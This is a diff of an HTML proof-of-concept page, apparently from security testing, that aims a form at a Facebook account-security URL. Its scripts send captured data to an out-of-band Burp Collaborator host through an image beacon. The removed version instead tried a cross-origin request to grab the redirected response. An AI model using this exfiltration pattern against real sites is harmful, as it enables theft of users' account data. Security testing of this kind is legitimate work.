@@ -3,38 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capture Redirected Response</title>
+    <title>Capture Form GET Parameters</title>
 </head>
 <body>
-    <form method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1" >
-		<input type="text" name="hide_back_button" value="1">
-		<input type="text" name="from_accounts_center" value="1">
-		<input type="submit" value="Send">
-	</form>
+    <form id="myForm" method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1">
+        <input type="hidden" name="hide_back_button" value="1">
+        <input type="hidden" name="from_accounts_center" value="1">
+        <input type="submit" value="Send">
+    </form>
     <script>
-        // Function to capture redirected response
-        function captureRedirectedResponse(response) {
-            // Send the redirected response to the Burp Suite collaborator
+        // Function to capture form GET parameters
+        function captureFormGETParameters() {
+            var form = document.getElementById('myForm');
+            var formData = new FormData(form); // Extract form data
+            var queryString = new URLSearchParams(formData).toString(); // Convert form data to query string
+            // Send the GET parameters to the Burp Suite collaborator
             var img = new Image();
-            img.src = "http://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro?redirectedResponse=" + encodeURIComponent(response);
+            img.src = "http://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro?getParameters=" + encodeURIComponent(queryString);
         }
 
-        // Function to intercept form submission and capture redirected response
+        // Function to intercept form submission and capture GET parameters
         function interceptFormSubmission(event) {
             event.preventDefault(); // Prevent the form from being submitted
-            var formData = new FormData(document.getElementById('myForm')); // Extract form data
-            // Perform form submission
-            setTimeout(function() {
-                var xhr = new XMLHttpRequest();
-                xhr.open('POST', document.getElementById('myForm').getAttribute('action'));
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState === XMLHttpRequest.DONE) {
-                        // Capture redirected response
-                        captureRedirectedResponse(xhr.responseText);
-                    }
-                };
-                xhr.send(formData);
-            }, 1000); // Adjust the delay as needed
+            captureFormGETParameters();
+            // Perform form submission (optional, if you want to submit the form)
+            //document.getElementById('myForm').submit();
         }
 
         // Call the function to intercept form submission when the page loads
